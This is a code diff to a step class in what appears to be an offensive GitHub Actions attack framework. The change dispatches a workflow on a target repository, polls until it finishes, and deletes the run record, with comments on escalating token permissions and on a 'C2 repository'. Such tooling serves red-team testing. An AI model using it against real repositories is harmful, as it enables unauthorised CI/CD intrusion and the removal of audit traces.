@@ -1,3 +1,5 @@
+import time
+
 from gatox.attack.pwnrequest.steps.attack_step import AttackStep
 from gatox.github.api import Api
 
@@ -36,6 +38,8 @@ class DispatchStep(AttackStep):
         if branch_resp.status_code != 200:
             Output.error(f"Branch {self.target_branch} not found in {self.target_repo}")
             return False
+        else:
+            self.head_sha = branch_resp.json()["commit"]["sha"]
 
         workflow_status = api.call_get(
             f"/repos/{self.target_repo}/actions/workflows/{self.target_workflow}"
@@ -93,24 +97,30 @@ class DispatchStep(AttackStep):
                 f"Successfully dispatched {self.target_workflow} on {self.target_branch}!"
             )
 
-            curr_time = AttackUtilities.get_current_time()
-            workflow_id = api.get_recent_workflow(
-                self.target_repo,
-                # resp.json()[0]["sha"],
-                self.target_workflow,
-                time_after=f">{curr_time}",
-            )
-
-            # Now wait for the workflow to complete
-            status = api.wait_for_workflow(
-                self.target_repo,
-                self.target_workflow,
-                self.target_branch,
-                credential_override=self.credential,
-            )
-
+            # Deleting runs requires waiting until the workflow finishes.
+            # For very complex chains (such as escalating GITHUB_TOKEN permissions via dispatch injection)
+            # you may want to not delete the run and instead do it manually from the first workflow's token.
             if self.delete_run:
-                status = api.call_delete(
-                    f"/repos/{self.target_repo}/actions/runs/{status.json()['id']}",
-                    credential_override=self.credential,
+                curr_time = AttackUtilities.get_current_time()
+                workflow_id = api.get_recent_workflow(
+                    self.target_repo,
+                    self.head_sha,
+                    self.target_workflow,
+                    time_after=f">{curr_time}",
                 )
+
+                for _ in range(self.timeout):
+                    status = api.get_workflow_status(self.target_repo, workflow_id)
+                    if status == -1 or status == 1:
+                        # We just need it to finish.
+                        break
+                    else:
+                        time.sleep(1)
+                else:
+                    Output.error(
+                        "The workflow is incomplete but hit the timeout, "
+                        "check the C2 repository manually to debug!"
+                    )
+                    return False
+
+                status = api.delete_workflow_run(self.target_repo, workflow_id)
